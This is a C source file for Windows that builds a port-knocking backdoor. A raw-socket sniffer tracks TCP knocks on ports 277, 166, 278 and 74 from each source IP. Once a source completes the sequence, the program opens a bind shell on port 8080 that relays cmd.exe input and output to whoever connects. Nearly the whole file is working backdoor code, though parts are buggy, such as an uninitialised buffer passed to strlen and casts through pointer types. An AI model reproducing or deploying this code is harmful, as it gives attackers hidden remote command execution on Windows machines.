#include "stdio.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "winsock2.h"
#include <time.h>
#include <stdbool.h>
#include <string.h>



#pragma comment(lib,"ws2_32.lib") //For winsock

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1) //this removes the need of mstcpip.h

void StartSniffing(SOCKET Sock); //This will sniff here and there

void ProcessPacket(char*, int); //This will decide how to digest
void PrintIpHeader(char*);
void PrintTcpPacket(char*, int);
void ConvertToHex(char*, unsigned int);
void PrintData(char*, int);


typedef struct ip_hdr
{
	unsigned char ip_header_len : 4; // 4-bit header length (in 32-bit words) normally=5 (Means 20 Bytes may be 24 also)
	unsigned char ip_version : 4; // 4-bit IPv4 version
	unsigned char ip_tos; // IP type of service
	unsigned short ip_total_length; // Total length
	unsigned short ip_id; // Unique identifier

	unsigned char ip_frag_offset : 5; // Fragment offset field

	unsigned char ip_more_fragment : 1;
	unsigned char ip_dont_fragment : 1;
	unsigned char ip_reserved_zero : 1;

	unsigned char ip_frag_offset1; //fragment offset

	unsigned char ip_ttl; // Time to live
	unsigned char ip_protocol; // Protocol(TCP,UDP etc)
	unsigned short ip_checksum; // IP checksum
	unsigned int ip_srcaddr; // Source address
	unsigned int ip_destaddr; // Source address
} IPV4_HDR;


// TCP header
typedef struct tcp_header
{
	unsigned short source_port; // source port
	unsigned short dest_port; // destination port
	unsigned int sequence; // sequence number - 32 bits
	unsigned int acknowledge; // acknowledgement number - 32 bits

	unsigned char ns : 1; //Nonce Sum Flag Added in RFC 3540.
	unsigned char reserved_part1 : 3; //according to rfc
	unsigned char data_offset : 4; /*The number of 32-bit words in the TCP header.
	This indicates where the data begins.
	The length of the TCP header is always a multiple
	of 32 bits.*/

	unsigned char fin : 1; //Finish Flag
	unsigned char syn : 1; //Synchronise Flag
	unsigned char rst : 1; //Reset Flag
	unsigned char psh : 1; //Push Flag
	unsigned char ack : 1; //Acknowledgement Flag
	unsigned char urg : 1; //Urgent Flag

	unsigned char ecn : 1; //ECN-Echo Flag
	unsigned char cwr : 1; //Congestion Window Reduced Flag

	////////////////////////////////

	unsigned short window; // window
	unsigned short checksum; // checksum
	unsigned short urgent_pointer; // urgent pointer
} TCP_HDR;


struct Knocker {
	struct sockaddr_in ip;
	int seqIndex;
	clock_t knockTime;
	bool IsEmpty;
} knockers[100];



int i, j;
struct sockaddr_in source, dest;
char hex[2];
BOOL IsElected;

//Its free!
IPV4_HDR* iphdr;
TCP_HDR* tcpheader;

unsigned short PORTS[4] = { 277, 278, 166, 74 };
PortsIndex = 0;



int main() {
	SOCKET sniffer;
	struct in_addr addr;
	int in;


	char hostname[100];
	struct hostent* local;
	WSADATA wsa;


	//Initialise Winsock
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("WSAStartup() failed.\n");
		return 1;
	}
	printf("Initialised");

	//Create a RAW Socket
	printf("\nCreating RAW Socket...");
	sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if (sniffer == INVALID_SOCKET)
	{
		printf("Failed to create raw socket.\n");
		return 1;
	}
	printf("Created.");

	//Retrive the local hostname
	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
		printf("Error : %d", WSAGetLastError());
		return 1;
	}
	printf("\nHost name : %s \n", hostname);

	//Retrive the available IPs of the local host
	local = gethostbyname(hostname);
	printf("\nAvailable Network Interfaces : \n");
	if (local == NULL)
	{
		printf("Error : %d.\n", WSAGetLastError());
		return 1;
	}

	for (i = 0; local->h_addr_list[i] != 0; ++i)
	{
		memcpy(&addr, local->h_addr_list[i], sizeof(struct in_addr));

	
		
		printf("iInterface Number : %d Address : %s\n", i, inet_ntoa(addr));
	}

	printf("Enter the interface number you would like to sniff : ");
	scanf("%d", &in);

	memset(&dest, 0, sizeof(dest));
	memcpy(&dest.sin_addr.s_addr, local->h_addr_list[in], sizeof(dest.sin_addr.s_addr));
	dest.sin_family = AF_INET;
	dest.sin_port = 0;

	printf("\nBinding socket to local system and port 0 ...");
	if (bind(sniffer, (struct sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR)
	{
		printf("bind(%s) failed.\n", inet_ntoa(addr));
		return 1;
	}
	printf("Binding successful");

	//Enable this socket with the power to sniff : SIO_RCVALL is the key Receive ALL ;)

	j = 1;
	printf("\nSetting socket to sniff...");
	if (WSAIoctl(sniffer, SIO_RCVALL, &j, sizeof(j), 0, 0, (LPDWORD)&in, 0, 0) == SOCKET_ERROR)
	{
		printf("WSAIoctl() failed.\n");
		return 1;
	}
	printf("Socket set.");

	//Begin
	printf("\nStarted Sniffing\n");
	printf("Packet Capture Statistics...\n");
	StartSniffing(sniffer); //Happy Sniffing

	//End
	closesocket(sniffer);
	WSACleanup();

	return 0;

}

void StartSniffing(SOCKET sniffer)
{
	// Initialize knockers
	for (int i = 0; i < 100; i++)
	{
		knockers[i].IsEmpty = true;

	}


	char* Buffer = (char*)malloc(65536); 
	int mangobyte;

	if (Buffer == NULL)
	{
		printf("malloc() failed.\n");
		return;
	}

	do
	{
		mangobyte = recvfrom(sniffer, Buffer, 65536, 0, 0, 0); 

		if (mangobyte > 0)
		{
			ProcessPacket(Buffer, mangobyte);
		}
		else
		{
			printf("\nrecvfrom() failed.\n");
		}
	} while (mangobyte > 0);

	free(Buffer);
}

void ProcessPacket(char* Buffer, int Size)
{
	iphdr = (IPV4_HDR*)Buffer;
	
	if (iphdr->ip_protocol == 6) {
		PrintTcpPacket(Buffer, Size);
	}
}

void bind_shell()
{
	WSADATA wsa;
	SOCKET s, new_socket;
	struct sockaddr_in server, client;
	int c;
	const char* message;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return;
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	//Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(8080);


	//Bind
	if (bind(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		printf("Bind failed with error code : %d", WSAGetLastError());
		closesocket(s);
		return;
	}

	listen(s, 1);

	c = sizeof(struct sockaddr_in);
	new_socket = accept(s, (struct sockaddr*)&client, &c);
	if (new_socket == INVALID_SOCKET)
	{
		printf("accept failed with error code : %d", WSAGetLastError());
		closesocket(s);
		return;
	}


	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.
	HANDLE hProcessInRead = NULL;
	HANDLE hProcessInWrite = NULL;
	HANDLE hProcessOutRead = NULL;
	HANDLE hProcessOutWrite = NULL;

	CreatePipe(&hProcessInRead, &hProcessInWrite, &saAttr, 0);
	CreatePipe(&hProcessOutRead, &hProcessOutWrite, &saAttr, 0);

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = hProcessOutWrite;
	siStartInfo.hStdOutput = hProcessOutWrite;
	siStartInfo.hStdInput = hProcessInRead;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	CHAR szCmdline[] = "cmd.exe";
	CreateProcessA(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
	while (true)
	{

		INT32 message_size = 0;
		recv(new_socket, (char*)&message_size, 4, 0);

		char* buff = (char*)malloc(message_size);
		memset(buff, 0, strlen(buff));
		DWORD x;
		recv(new_socket, buff, message_size, 0);
		printf("the command is %s\n", buff);
		if (strcmp(buff, "exit\r\n") == 0) {
			printf("exit...");
			TerminateProcess(piProcInfo.hProcess, 0);
			ResumeThread(piProcInfo.hThread);
			CloseHandle(piProcInfo.hThread);
			CloseHandle(piProcInfo.hProcess);
			closesocket(new_socket);
			closesocket(s);
			
			return;

		}

		WriteFile(hProcessInWrite, buff, message_size, &x, NULL);
		printf("WROTE\n");
		Sleep(5000);

		char* out_buffer = (char*)malloc(65535);
		ZeroMemory(out_buffer, 65535);
		DWORD xx;
		ReadFile(hProcessOutRead, out_buffer, 65535, &xx, NULL);
		printf("READED %s\n", out_buffer);



		send(new_socket, out_buffer, strlen(out_buffer), 0);




	}


	closesocket(s);
	return;


}

void Knock(int SeqI) {
	//Check if the ip already exsits and in the time window and in the correct oreder
	int knockersIndex;
	knockersIndex = CheckIp();

	if (knockersIndex != -1) {
		clock_t difference = clock() - knockers[knockersIndex].knockTime;
		int msec = ((difference * 1000) / CLOCKS_PER_SEC) / 1000;

		if (msec < 60 && (SeqI-1) == knockers[knockersIndex].seqIndex) {
			knockers[knockersIndex].seqIndex++;
			knockers[knockersIndex].knockTime = clock();

		}
		// Delete this knocker 
		else {
			memset(&knockers[knockersIndex].ip, 0, sizeof(struct sockaddr_in));//knockers[knockersIndex].ip = 0
			knockers[knockersIndex].IsEmpty = true;
			knockers[knockersIndex].knockTime = NULL;
			knockers[knockersIndex].seqIndex = NULL;
			
		}

		if (knockers[knockersIndex].seqIndex == 4) {
			memset(&knockers[knockersIndex].ip, 0, sizeof(struct sockaddr_in));
			knockers[knockersIndex].IsEmpty = true;
			knockers[knockersIndex].knockTime = NULL;
			knockers[knockersIndex].seqIndex = NULL;
			printf("sucsesss\n");
			bind_shell();
			printf("Done\n");
		}
	}
}



int CheckIp() {

	for (int i = 0; i<100 ; i++) {

		if (knockers[i].ip.sin_addr.s_addr == source.sin_addr.s_addr) {
			printf("return %d\n", i);
			return i;
		}
	}
	printf("return -1\n");
	return -1;
}


void PrintTcpPacket(char* Buffer, int Size)
{
	unsigned short iphdrlen;
	
	iphdr = (IPV4_HDR*)Buffer;
	iphdrlen = iphdr->ip_header_len * 4;

	tcpheader = (TCP_HDR*)(Buffer + iphdrlen);
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iphdr->ip_srcaddr;
	

	// First knock
	if (ntohs(tcpheader->dest_port) == (unsigned short*)277 ){
		int knockersIndex;
		knockersIndex = CheckIp();

		

		// Ignore if the knocker exits, create struct if it doesn't.
		if (knockersIndex == -1) {
			printf("knock number 1\n");
			printf("is empty %d\n", knockers[i].IsEmpty);
			// Search for empty struct, if there is no place - ignore
			for (int i = 0; i < 100; i++) {
				if (knockers[i].IsEmpty) {
					printf("strat to initialize\n");
					memset(&knockers[i].ip, 0, sizeof(struct in_addr));
					knockers[i].ip.sin_addr.s_addr = iphdr->ip_srcaddr;
					knockers[i].knockTime = clock();
					knockers[i].seqIndex = 1;
					knockers[i].IsEmpty = false;
					break;
				}
			}
			printf("the ip %s\n", inet_ntoa(source.sin_addr));
			for (int i = 0; i < 100; i++) {
				if (knockers[i].ip.sin_addr.s_addr == source.sin_addr.s_addr) {
					printf("the check work\n");
					break;
				}
			}

			
		}
		PortsIndex++;

	}//Other knock
	else {
		if (ntohs(tcpheader->dest_port) == (unsigned short*)166) {
			printf("knock number 2\n");
			Knock(2);
		}
		
		if (ntohs(tcpheader->dest_port) == (unsigned short*)278) {
			printf("knock number 3\n");
			Knock(3);
		}

		if (ntohs(tcpheader->dest_port) == (unsigned short*)74) {
			printf("knock number 4\n");
			Knock(4);

		}
	}
}
